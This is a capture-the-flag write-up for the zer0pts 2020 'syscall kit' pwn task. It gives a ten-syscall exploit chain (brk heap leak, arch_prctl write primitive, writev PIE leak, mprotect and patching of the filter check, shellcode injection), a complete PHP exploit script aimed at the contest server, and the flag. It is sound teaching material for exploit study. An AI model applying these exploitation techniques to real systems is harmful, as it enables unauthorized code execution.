# sycall kit - zer0pts CTF 2020 (pwn, 671p, 12 solved)  
## Introduction

syscall kit is a pwn task.

An archive containing a binary, and its source code is provided.

The binary lets the user call syscalls with 3 arguments of its choice. Some  
syscalls (deemed to be dangerous) are banned. The user can call up to 10  
syscalls before the program exits.

## Analysis

There are two problems making this task hard : every dangerous (read:  
interesting) syscalls are banned.  Besides, the binary is PIE, so no addresses  
are known. This means it is not possible to leak addresses, or pass valid  
addresses to syscalls.

The first thing to do is to retrieve an address.

This can be done with the `brk` syscall. This syscall extends the program
break  
(i.e. the heap) when the memory allocator needs additional memory.

Its signature is : `int brk(void *addr);`. The manual states the following:  
> On success, brk() returns zero.  On error, -1 is returned, and errno is set
> to  
> ENOMEM.

However, it also states the following in the `NOTES` section:  
> The return value described above for brk() is the behavior provided by the  
> glibc wrapper function for the Linux brk() system call. [...]  
> However, the actual Linux system call returns the new program break on  
> success.

`brk(0x10000)` returns the start of the heap + 0x10000.

The heap can now be used as a scratchpad.

Calling the `arch_prctl` syscall with values `ARCH_SET_GS` and `ARCH_GET_GS`
can  
be used to write 6-bytes values anywhere. (the value must be a valid address,  
therefore it must have the first 12 bits set to either 1 or 0.)

The following syscalls will write `0xdeadbeef` in the heap :  
```c  
arch_prctl(ARCH_SET_GS, 0xdeadbeef);  
arch_prctl(ARCH_GET_GS, $heap);  
```

This primitive can be used to write two integers in the heap :

```c  
struct iovec {  
	void  *iov_base;  
	size_t iov_len;  
} s = {  
	.iov_base = heap,  
	.iov_len  = 0x2000,  
};  
```

This structure is used by the `writev` and `readv` syscalls. They are not  
blacklsited, and can be used to write 2 whole pages of the content of the heap  
to stdout.

The heap contains an address of the vtable of the `Emulator` object. This can
be  
used to determine the base address of the program.

The `mprotect` syscall can then be used to make these pages writable. This can  
be used to patch the `check` function so that it always validates syscalls :

```assembler  
31 c0 xor eax, eax  
c3    ret  
```

Once the check function has been patched, the `write` syscall can be used to
put  
a shellcode at `0x12c6`. That shellcode will get executed as soon as the
binary  
returns from the `write` syscall.

## Exploitation

The ten syscalls used to get a shell are the following :  
1. `brk(0x10000)`  
2. `arch_prctl(ARCH_SET_GS, $heap)`  
3. `arch_prctl(ARCH_GET_GS, $heap)`  
4. `arch_prctl(ARCH_SET_GS, 0x2000)`  
5. `arch_prctl(ARCH_GET_GS, $heap + 8)`  
6. `writev(STDOUT_FILENO, $heap, 1)`  
7. `mprotect($base, 0x1000, PROT_RWX)`  
8. `arch_prctl(ARCH_SET_GS, 0xC3C031)`  
9. `arch_prctl(ARCH_GET_GS, $check)`  
10. `write(0, $syscall + 0x46, 0x40)`

**Flag**: `zer0pts{n0_w4y!_i_b4nn3d_3v3ry_d4ng3r0us_sysc4ll!}`

## Appendices

### pwn.php

```php  
#!/usr/bin/php  
expectLine("=========================");  
	$t->expect("syscall: "); $t->write("$syscall\n");  
	$t->expect("arg1: ");    $t->write("$arg1\n");  
	$t->expect("arg2: ");    $t->write("$arg2\n");  
	$t->expect("arg3: ");    $t->write("$arg3\n");  
	$t->expectLine("=========================");  
}

function ret(Tube $t)  
{  
	$t->expect("retval: ");  
	return hexdec($t->readLine());  
}

function write64(Tube $t, $addr, $value)  
{  
	syscall($t, 158, 0x1001, $value);  
	ret($t);

	syscall($t, 158, 0x1004, $addr);  
	ret($t);  
}

$t = new Socket("13.231.207.73", 9006);

/* brk() */  
syscall($t, 12,  0x10000);  
$brk = ret($t) - 0x10000;  
printf("[+] heap: %X\n", $brk);

write64($t, $brk, $brk);  
write64($t, $brk + 8, 0x2000);

syscall($t, 20, 1, $brk, 1);  
$leak = $t->read(0x2000);  
ret($t);

$addr = 0;  
for($i = 0; $i < strlen($leak); $i += 8) {  
	$qword = unpack("Q", substr($leak, $i, 8))[1];  
	if(0xCE0 === (0xFFF & $qword)) {  
		$addr = $qword;  
		break;  
	}  
}

if($addr === 0)  
	throw new Exception("[!] Leak failed\n");

$base = $addr - 0x00202ce0;  
printf("[+] PIE: %X\n", $base);

/* mprotect */  
syscall($t, 10, $base, 0x2000, 7); ret($t);

/* patch */  
write64($t, $base + 0x116e, 0xC3C031);

// read after syscall  
syscall($t, 0, 0, $base + 0x000012c6, 0x40);  
$t->write(file_get_contents("shellcode"));

$t->pipe();  
```

Original writeup
(https://github.com/TFNS/writeups/blob/master/2020-03-07-zer0ptsCTF/syscall/README.md).